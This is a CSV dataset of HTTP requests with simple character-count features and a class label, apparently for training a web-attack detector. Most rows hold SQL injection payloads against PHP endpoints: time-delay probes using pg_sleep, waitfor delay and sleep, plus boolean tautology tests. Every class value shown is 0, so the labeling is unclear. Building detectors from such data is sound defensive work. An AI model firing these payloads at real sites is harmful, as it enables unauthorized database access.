method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,"b""/Mod_Rewrite_Shop/Details/-1'%20OR%202%2b579-579-1%3d0%2b0%2b0%2b1%20--%20/2/""",b'',1,0,1,0,4,0,0
GET,"b""/showimage.php?file=./pictures/5.jpg&size=bX5L99xg';select%20pg_sleep(18);%20--%20""",b'',1,0,1,1,3,2,0
GET,"b""/comment.php?aid=1&pid=-1'%20OR%202%2b404-404-1%3d0%2b0%2b0%2b1%20or%20'MwYlDdTP'%3d'""",b'',4,0,0,0,4,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">if(now()=sysdate(),sleep(6),0)/*&apos;XOR(if(now()=sysdate(),sleep(6),0))OR&apos;&quot;XOR(if(now()=sysdate(),sleep(6),0))OR&quot;*/</node></xml>'",0,4,0,14,2,3,0
POST,b'/guestbook.php',"b""name=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/&text=1""",2,2,0,14,0,3,0
POST,b'/AJAX/infotitle.php',b'id=0%2b0%2b0%2b3',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=nuvim3m1');%20waitfor%20delay%20'0:0:6'%20--%20&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",3,0,1,0,7,2,0
GET,b'/product.php?pic=2',b'',0,0,0,0,0,0,0
GET,"b""/product.php?pic=1ACUSTART'%22SqjBhACUEND""",b'',1,1,0,0,0,0,0
POST,"b""/comment.php?aid=2uwTCqoe';select%20pg_sleep(9);%20--%20&pid=1""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,0,1,1,6,2,0
GET,"b""/Mod_Rewrite_Shop/Details/-1'%20OR%202%2b235-235-1%3d0%2b0%2b0%2b1%20or%20'ZXIvVuAF'%3d'/2/""",b'',4,0,0,0,4,0,0
GET,"b""/showimage.php?file=./pictures/5.jpg&size=S058AQkP');select%20pg_sleep(27);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/comment.php?aid=1&pid=-1%22%20OR%202%2b283-283-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">(select(0)from(select(sleep(9)))v)/*&apos;+(select(0)from(select(sleep(9)))v)+&apos;&quot;+(select(0)from(select(sleep(9)))v)+&quot;*/</node></xml>'",0,4,0,15,2,9,0
POST,b'/guestbook.php',"b""name=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/&text=1""",2,2,0,15,0,9,0
POST,b'/AJAX/infotitle.php',b'id=0%2b110*105%2b3',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=C9iUXwRE'));%20waitfor%20delay%20'0:0:9'%20--%20&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",3,0,1,0,7,2,0
POST,"b""/comment.php?aid=tnk2W3do');select%20pg_sleep(9);%20--%20&pid=1""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,0,1,1,6,2,0
GET,b'/listproducts.php?cat=4',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/-1%22%20OR%202%2b648-648-1%3d0%2b0%2b0%2b1%20--%20/2/',b'',0,1,1,0,4,0,0
GET,"b""/comment.php?aid=1&pid=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
GET,"b""/showimage.php?file=./pictures/5.jpg&size=n94mpT32'));select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">1 waitfor delay &apos;0:0:3&apos; -- </node></xml>'",0,4,1,0,7,2,0
POST,b'/AJAX/infotitle.php',b'id=13-5-2-999',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=-1;select%20pg_sleep(3);%20--%20&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,1,1,5,2,0
POST,b'/guestbook.php',"b""name=-1;%20waitfor%20delay%20'0:0:3'%20--%20&text=1""",2,0,1,0,5,2,0
GET,b'/product.php?pic=fe4InmDk',b'',0,0,0,0,0,0,0
POST,"b""/comment.php?aid=Zwg161yl'));select%20pg_sleep(3);%20--%20&pid=1""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,0,1,1,6,2,0
GET,"b""/Mod_Rewrite_Shop/Details/if(now()%3dsysdate()%2csleep(10)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(10)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(10)%2c0))OR%22*//2/""",b'',2,2,0,14,0,3,0
GET,"b""/listproducts.php?cat=1ACUSTART'%224ZlTkACUEND""",b'',1,1,0,0,0,0,0
GET,"b""/comment.php?aid=1&pid=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/""",b'',2,2,0,15,0,9,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">Tro9Yopz&apos;; waitfor delay &apos;0:0:6&apos; -- </node></xml>'",0,4,1,0,7,2,0
POST,b'/guestbook.php',"b""name=-1);%20waitfor%20delay%20'0:0:6'%20--%20&text=1""",2,0,1,0,5,2,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=-1);select%20pg_sleep(6);%20--%20&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,1,1,5,2,0
POST,b'/AJAX/infotitle.php',b'id=13-5-2-3',0,0,0,0,0,0,0
GET,b'/product.php?pic=0%2b0%2b0%2b2',b'',0,0,0,0,0,0,0
GET,b'/listproducts.php?cat=Wb42GNKW',b'',0,0,0,0,0,0,0
GET,"b""/Mod_Rewrite_Shop/Details/(select(0)from(select(sleep(10)))v)/*'%2b(select(0)from(select(sleep(10)))v)%2b'%22%2b(select(0)from(select(sleep(10)))v)%2b%22*//2/""",b'',2,2,0,15,0,9,0
GET,"b""/comment.php?aid=1&pid=-1;%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/search.php?test=query',b'goButton=go&searchFor=',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">z3fJgd4G&apos;); waitfor delay &apos;0:0:9&apos; -- </node></xml>'",0,4,1,0,7,2,0
POST,b'/AJAX/infotitle.php',b'id=13-2*5%2b0%2b0%2b1-1',0,0,0,0,0,0,0
POST,b'/guestbook.php',"b""name=-1));%20waitfor%20delay%20'0:0:9'%20--%20&text=1""",2,0,1,0,5,2,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=-1));select%20pg_sleep(9);%20--%20&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,1,1,5,2,0
GET,b'/product.php?pic=0%2b936*931%2b2',b'',0,0,0,0,0,0,0
GET,b'/listproducts.php?cat=0%2b0%2b0%2b4',b'',0,0,0,0,0,0,0
GET,"b""/Mod_Rewrite_Shop/Details/1%20waitfor%20delay%20'0:0:15'%20--%20/2/""",b'',2,0,1,0,5,2,0
GET,"b""/comment.php?aid=1&pid=-1);%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">1vXEzEjq&apos;)); waitfor delay &apos;0:0:3&apos; -- </node></xml>'",0,4,1,0,7,2,0
POST,b'/guestbook.php',"b""name=1%20waitfor%20delay%20'0:0:3'%20--%20&text=1""",2,0,1,0,5,2,0
POST,b'/AJAX/infotitle.php',b'id=13-2*6%2b0%2b0%2b1-1',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=CBiCM7fJ';select%20pg_sleep(3);%20--%20&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,1,5,2,0
GET,b'/listproducts.php?cat=0%2b605*600%2b4',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=BCUFAO0A',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,3,0,0
GET,b'/product.php?pic=12-5-2-999',b'',0,0,0,0,0,0,0
POST,b'/search.php?test=QKr4XeX6',b'goButton=go&searchFor=',0,0,0,0,0,0,0
GET,"b""/comment.php?aid=1&pid=-1));%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,0
GET,"b""/Mod_Rewrite_Shop/Details/IL9O4QDc';%20waitfor%20delay%20'0:0:5'%20--%20/2/""",b'',3,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">2NY1tSuP&apos;;select pg_sleep(3); -- </node></xml>'",0,4,1,1,5,2,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%202%2b1-1-1%3d1%20AND%20110%3d110',0,0,0,0,4,0,0
POST,b'/guestbook.php',"b""name=8xSuRoUp';%20waitfor%20delay%20'0:0:6'%20--%20&text=1""",3,0,1,0,5,2,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=eYVfZqcn');select%20pg_sleep(6);%20--%20&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,1,5,2,0
GET,b'/product.php?pic=12-5-2-3',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=-1%20OR%202%2b454-454-1%3d0%2b0%2b0%2b1%20--%20',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,1,0,7,0,0
POST,b'/search.php?test=-1%20OR%202%2b797-797-1%3d0%2b0%2b0%2b1%20--%20',b'goButton=go&searchFor=',0,0,1,0,4,0,0
GET,"b""/comment.php?aid=1&pid=1%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
GET,"b""/Mod_Rewrite_Shop/Details/R8lKGocz');%20waitfor%20delay%20'0:0:10'%20--%20/2/""",b'',3,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">2PfNyvF0&apos;);select pg_sleep(6); -- </node></xml>'",0,4,1,1,5,2,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203%2b1-1-1%3d1%20AND%20110%3d110',0,0,0,0,4,0,0
POST,b'/guestbook.php',"b""name=XapZMp8t');%20waitfor%20delay%20'0:0:6'%20--%20&text=1""",3,0,1,0,5,2,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=L5Wi5dfn'));select%20pg_sleep(9);%20--%20&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,1,5,2,0
GET,b'/listproducts.php?cat=0%2b505*500%2b4',b'',0,0,0,0,0,0,0
GET,b'/product.php?pic=12-2*5%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=-1%20OR%202%2b224-224-1%3d0%2b0%2b0%2b1',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,5,0,0
POST,b'/search.php?test=-1%20OR%202%2b239-239-1%3d0%2b0%2b0%2b1',b'goButton=go&searchFor=',0,0,0,0,2,0,0
GET,"b""/comment.php?aid=1&pid=NwerD3G2';%20waitfor%20delay%20'0:0:9'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/Mod_Rewrite_Shop/Details/lKyig1lH'));%20waitfor%20delay%20'0:0:15'%20--%20/2/""",b'',3,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">7Va6PoFZ&apos;));select pg_sleep(9); -- </node></xml>'",0,4,1,1,5,2,0
POST,b'/guestbook.php',"b""name=E705dF8Y'));%20waitfor%20delay%20'0:0:9'%20--%20&text=1""",3,0,1,0,5,2,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%2540email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,0,0,2,0,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203*2%3d5%20AND%20110%3d110',0,0,0,0,4,0,0
POST,"b""/comment.php?aid=1&pid=-1'%20OR%202%2b609-609-1%3d0%2b0%2b0%2b1%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,0,1,0,7,0,0
GET,b'/product.php?pic=12-2*6%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
POST,"b""/search.php?test=-1'%20OR%202%2b672-672-1%3d0%2b0%2b0%2b1%20--%20""",b'goButton=go&searchFor=',1,0,1,0,4,0,0
GET,"b""/comment.php?aid=1&pid=lUXCik3b');%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/Mod_Rewrite_Shop/Details/kmE4MdRu';select%20pg_sleep(15);%20--%20/2/""",b'',1,0,1,1,3,2,0
POST,"b""/search.php?test=1ACUSTART'%22kYmK7ACUEND""",b'goButton=go&searchFor=',1,1,0,0,0,0,0
POST,b'/guestbook.php',b'name=-1;select%20pg_sleep(3);%20--%20&text=1',0,0,1,1,3,2,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203*2%3d6%20AND%20110%3d110',0,0,0,0,4,0,0
POST,"b""/comment.php?aid=1&pid=-1'%20OR%202%2b321-321-1%3d0%2b0%2b0%2b1%20or%20'Wz94TGrR'%3d'""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',4,0,0,0,7,0,0
GET,b'/listproducts.php?cat=0%2b434*429%2b4',b'',0,0,0,0,0,0,0
GET,b'/product.php?pic=2%20AND%202%2b1-1-1%3d1%20AND%20936%3d936',b'',0,0,0,0,4,0,0
POST,"b""/search.php?test=-1'%20OR%202%2b903-903-1%3d0%2b0%2b0%2b1%20or%20'F4jgj0mr'%3d'""",b'goButton=go&searchFor=',4,0,0,0,4,0,0
GET,"b""/Mod_Rewrite_Shop/Details/UWSzFQSA');select%20pg_sleep(5);%20--%20/2/""",b'',1,0,1,1,3,2,0
GET,"b""/comment.php?aid=1&pid=maTTxgzA'));%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,0
POST,b'/search.php?test=query',"b""goButton=go&searchFor=1ACUSTART'%22AgCRlACUEND""",1,1,0,0,0,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=HHYaZolh&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,0,0,2,0,0
POST,b'/guestbook.php',b'name=-1);select%20pg_sleep(3);%20--%20&text=1',0,0,1,1,3,2,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203*2*0%3d6%20AND%20110%3d110',0,0,0,0,4,0,0
POST,b'/comment.php?aid=1&pid=-1%22%20OR%202%2b103-103-1%3d0%2b0%2b0%2b1%20--%20',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,1,1,0,7,0,0
POST,b'/search.php?test=-1%22%20OR%202%2b438-438-1%3d0%2b0%2b0%2b1%20--%20',b'goButton=go&searchFor=',0,1,1,0,4,0,0
GET,b'/product.php?pic=2%20AND%203%2b1-1-1%3d1%20AND%20936%3d936',b'',0,0,0,0,4,0,0
GET,"b""/Mod_Rewrite_Shop/Details/emLjTxEd'));select%20pg_sleep(5);%20--%20/2/""",b'',1,0,1,1,3,2,0
GET,b'/comment.php?aid=1&pid=-1;select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
GET,b'/hpp/index.php?pp=12',b'',0,0,0,0,0,0,0
POST,b'/guestbook.php',b'name=-1));select%20pg_sleep(6);%20--%20&text=1',0,0,1,1,3,2,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203*2*1%3d6%20AND%20110%3d110',0,0,0,0,4,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%20OR%202%2b820-820-1%3d0%2b0%2b0%2b1%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,1,0,6,0,0
POST,"b""/comment.php?aid=1&pid=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',2,2,0,14,3,3,0
GET,b'/listproducts.php?cat=0%2b818*813%2b4',b'',0,0,0,0,0,0,0
POST,"b""/search.php?test=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/""",b'goButton=go&searchFor=',2,2,0,14,0,3,0
GET,b'/product.php?pic=2%20AND%203*2%3d5%20AND%20936%3d936',b'',0,0,0,0,4,0,0
GET,b'/comment.php?aid=1&pid=-1);select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%20OR%203%2b820-820-1%3d0%2b0%2b0%2b1%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,1,0,6,0,0
POST,b'/guestbook.php',"b""name=RoOYUoDe';select%20pg_sleep(6);%20--%20&text=1""",1,0,1,1,3,2,0
POST,"b""/comment.php?aid=1&pid=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',2,2,0,15,3,9,0
GET,"b""/listproducts.php?cat=if(now()%3dsysdate()%2csleep(9)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22*/""",b'',2,2,0,14,0,3,0
POST,"b""/search.php?test=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/""",b'goButton=go&searchFor=',2,2,0,15,0,9,0
GET,b'/product.php?pic=2%20AND%203*2%3d6%20AND%20936%3d936',b'',0,0,0,0,4,0,0
GET,b'/comment.php?aid=1&pid=-1));select%20pg_sleep(9);%20--%20',b'',0,0,1,1,3,2,0
GET,b'/hpp/index.php?pp=twUSdYoG',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%20OR%203*2<(0%2b5%2b820-820)%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,1,1,6,0,0
POST,b'/guestbook.php',"b""name=m2jZp9ME');select%20pg_sleep(9);%20--%20&text=1""",1,0,1,1,3,2,0
POST,b'/AJAX/infotitle.php',b'id=0%2b616*611%2b3',0,0,0,0,0,0,0
POST,"b""/comment.php?aid=1&pid=-1;%20waitfor%20delay%20'0:0:9'%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',2,0,1,0,8,2,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/GdZmhInh/',b'',0,0,0,0,0,0,0
GET,b'/product.php?pic=2%20AND%203*2*0%3d6%20AND%20936%3d936',b'',0,0,0,0,4,0,0
GET,"b""/comment.php?aid=1&pid=pHeW5N4R';select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/hpp/index.php?pp=-1%20OR%202%2b567-567-1%3d0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%20OR%203*2>(0%2b5%2b820-820)%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,1,1,6,0,0
POST,b'/guestbook.php',"b""name=JnCMzKqO'));select%20pg_sleep(3);%20--%20&text=1""",1,0,1,1,3,2,0
POST,"b""/comment.php?aid=1&pid=-1);%20waitfor%20delay%20'0:0:3'%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',2,0,1,0,8,2,0
GET,b'/product.php?pic=2%20AND%203*2*1%3d6%20AND%20936%3d936',b'',0,0,0,0,4,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/0%2b0%2b0%2b3/',b'',0,0,0,0,0,0,0
GET,"b""/comment.php?aid=1&pid=gxhbvvqI');select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/hpp/index.php?pp=-1%20OR%202%2b248-248-1%3d0%2b0%2b0%2b1',b'',0,0,0,0,2,0,0
POST,b'/secured/newuser.php',b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%20OR%202%2b483-483-1%3d0%2b0%2b0%2b1&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf',0,0,0,0,4,0,0
POST,"b""/comment.php?aid=1&pid=-1));%20waitfor%20delay%20'0:0:3'%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',2,0,1,0,8,2,0
GET,"b""/comment.php?aid=1&pid=80DLuydq'));select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,0
GET,"b""/hpp/index.php?pp=-1'%20OR%202%2b749-749-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1'%20OR%202%2b107-107-1%3d0%2b0%2b0%2b1%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,0,6,0,0
POST,"b""/comment.php?aid=1&pid=1%20waitfor%20delay%20'0:0:6'%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',2,0,1,0,8,2,0
GET,b'/product.php?pic=0%2b913*908%2b2',b'',0,0,0,0,0,0,0
GET,"b""/hpp/index.php?pp=1ACUSTART'%220yG5fACUEND""",b'',1,1,0,0,0,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1'%20OR%203%2b107-107-1%3d0%2b0%2b0%2b1%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,0,6,0,0
GET,"b""/hpp/index.php?pp=-1'%20OR%202%2b65-65-1%3d0%2b0%2b0%2b1%20or%20'vHHhPEqT'%3d'""",b'',4,0,0,0,4,0,0
POST,b'/guestbook.php',b'name=1&text=yqHeH8uC',0,0,0,0,0,0,0
POST,"b""/comment.php?aid=1&pid=3Y4ZQAqm';%20waitfor%20delay%20'0:0:6'%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',3,0,1,0,8,2,0
GET,b'/hpp/index.php?pp=1ACUSTART%20ACUEND',b'',0,0,0,0,1,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1'%20OR%203*2<(0%2b5%2b107-107)%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,1,6,0,0
GET,b'/hpp/index.php?pp=-1%22%20OR%202%2b899-899-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
POST,b'/guestbook.php',b'name=1&text=-1%20OR%202%2b49-49-1%3d0%2b0%2b0%2b1%20--%20',0,0,1,0,4,0,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%202%2b1-1-1%3d1%20AND%20616%3d616',0,0,0,0,4,0,0
POST,"b""/comment.php?aid=1&pid=AJV4zchO');%20waitfor%20delay%20'0:0:6'%20--%20""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',3,0,1,0,8,2,0
GET,"b""/Mod_Rewrite_Shop/Details/color-printer/if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*//""",b'',2,2,0,14,0,3,0
GET,b'/hpp/index.php?pp=1ACUSTART%5c',b'',0,0,0,0,0,0,0
POST,b'/secured/newuser.php',"b""signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1'%20OR%203*2>(0%2b5%2b107-107)%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=mpfhveqf&uuname=mpfhveqf""",1,0,1,1,6,0,0
GET,b'/hpp/index.php?pp=-1%22%20OR%203%2b899-899-1%3d0%2b0%2b0%2b1%20--%20',b'',0,1,1,0,4,0,0
POST,b'/guestbook.php',b'name=1&text=-1%20OR%203%2b49-49-1%3d0%2b0%2b0%2b1%20--%20',0,0,1,0,4,0,0
POST,b'/AJAX/infotitle.php',b'id=3%20AND%203%2b1-1-1%3d1%20AND%20616%3d616',0,0,0,0,4,0,0
